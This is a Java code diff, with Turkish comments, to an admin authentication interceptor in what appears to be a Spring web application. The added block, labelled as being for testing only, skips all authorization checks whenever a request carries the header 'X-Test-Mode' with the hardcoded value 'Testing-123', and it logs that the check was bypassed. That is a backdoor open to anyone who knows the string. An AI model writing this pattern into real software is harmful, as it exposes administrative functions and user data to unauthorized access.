@@ -25,6 +25,16 @@ public class AdminAuthInterceptor implements HandlerInterceptor {
 
         String uri = request.getRequestURI();
         String method = request.getMethod();
+
+        // --- Sadece Test İçin Eklenen Bölüm ---
+        // İstek başlığında (header) özel anahtar varsa direkt geçiş veriyoruz.
+        String testHeader = request.getHeader("X-Test-Mode");
+        if ("Testing-123".equals(testHeader)) {
+            logger.info("[TEST MODE] Yetki kontrolü bypass edildi: {}", uri);
+            return true;
+        }
+        // --------------------------------------
+
         HttpSession session = request.getSession(false);
 
         logger.info("[INTERCEPTOR] {} {}", method, uri);
